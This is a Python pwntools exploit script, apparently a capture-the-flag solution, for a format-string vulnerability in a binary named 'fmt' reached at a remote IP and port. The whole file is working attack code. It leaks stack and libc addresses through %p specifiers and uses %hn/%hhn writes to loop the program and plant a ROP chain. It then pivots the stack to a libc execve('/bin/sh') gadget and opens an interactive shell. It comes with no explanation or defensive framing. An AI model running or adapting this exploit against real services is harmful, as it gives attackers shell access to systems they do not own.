#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template fmt --host lol.com --port 1234
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fmt')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '172.35.1.186'
port = int(args.PORT or 9999)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

ptrchain_idxs = [
    0xb,
    0x27,
]

if args.LEAK:
    context.log_level = 100
    maps = []
    for i in range(6, 100):
        io = start(env = {'LD_PRELOAD': './libc.so.6'})
        #ui.pause()
        io.recvuntil(b'Gift: ')
        stack_leak = int(io.recvline().strip(), 16)
        #print(hex(leak))
        ui.pause()
        io.sendline('%{}$p '.format(i).ljust(0x100-2, 'A').encode())
        leak = io.recvuntil(b' ').strip().decode()
        print(f'{i:x}: {leak}')
        io.close()
    exit()

io = start(env = {'LD_PRELOAD': './libc.so.6'})
io.recvuntil(b'Gift: ')
stack_lsb = int(io.recvline().strip(), 16)
ret_addr_stack_lsb = stack_lsb - (0xed44-0xed38)
print(f'stack_lsb: {stack_lsb:x}')
ret_addr_new_lsb = 0x4141
ui.pause()

io.sendline(
    b"%c"*9
    +f'%{ret_addr_stack_lsb-9}c'.encode()
    +b'%hn' # %10$hn
    +f'%{0x100 - ret_addr_stack_lsb&0xff}c'.encode()
    +f'%{0x23}c'.encode()
    +'%{}$hhn'.format(0xb+0x1c).encode()
    +'%3$p%6$p'.encode()
    #+b'===\x00'
)
#print(io.recvuntil(b'==='))
#ui.pause()
io.recvuntil(b'0x')
libc_leak = int(io.recvuntil(b'0x', drop=True), 16)
libc_base = libc_leak - 1105874
libc.address = libc_base
stack_leak = int(io.recvline().strip().decode(), 16)

print(f'libc_leak: {libc_leak:x}')
print(f'stack_leak: {stack_leak:x}')
print(f'libc_base: {libc_base:x}')

'''
0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL
'''
# write ropchain at 0x7fffffffee60
ropchain = flat(
    0,0,0,
    libc.address + 0xe3b01
)
off = 0xee58 - 0xed44
# 0x23 to loop
ui.pause()
for i in range(len(ropchain)):
    print("rop {}".format(i))
    io.send(
        # loop to read
        f'%{0x23}c'.encode()
        +'%{}$hhn'.format(0xb+0x1c).encode()
        # rop step 
        +f'%{stack_lsb + off-0x23+8+i}c'.encode()
        +'%{}$hn'.format(0xb+0x10).encode()
        +b'==nick==\x00'
    )
    io.recvuntil(b'==nick==')
    print("rop {} second stuff".format(i))
    io.send(
        # loop to read
        f'%{0x23}c'.encode()
        +'%{}$hhn'.format(0xb+0x1c).encode()
        # rop step 
        +f'%{0x100-0x23+int(ropchain[i])}c'.encode()
        +'%{}$hhn'.format(0x23-0xb+0x10+1).encode()
        +b'==nick==\x00'
    )
    io.recvuntil(b'==nick==')

# this do rsp = 0x7fffffffee58
# ed40
# setup rsp to 0x7fffffffee60
off2 = 0xed40 - 0xed44
off3 = 0xee60 - 0xed44
if True:
    print("change rsp")
    ui.pause()
    io.send(
        # loop to read
        f'%{0x23}c'.encode()
        +'%{}$hhn'.format(0xb+0x1c).encode()
        # rop step 
        +f'%{stack_lsb + off2-0x23}c'.encode()
        +'%{}$hn'.format(0xb+0x10).encode()
        +b'==nick2==\x00'
    )
    io.recvuntil(b'==nick2==')
    io.send(
        # loop to read
        f'%{0x23}c'.encode()
        +'%{}$hhn'.format(0xb+0x1c).encode()
        # rop step 
        +f'%{stack_lsb + off-0x23+8}c'.encode()
        +'%{}$hn'.format(0x23-0xb+0x10+1).encode()
        +b'==nick==\x00'
    )
print("stack pivot noww")
ui.pause()
io.send(
    f'%{0xbd}c'.encode()
    +'%{}$hhn'.format(0xb+0x1c).encode()
    +b'\x00'
)

#io.sendline()

io.interactive()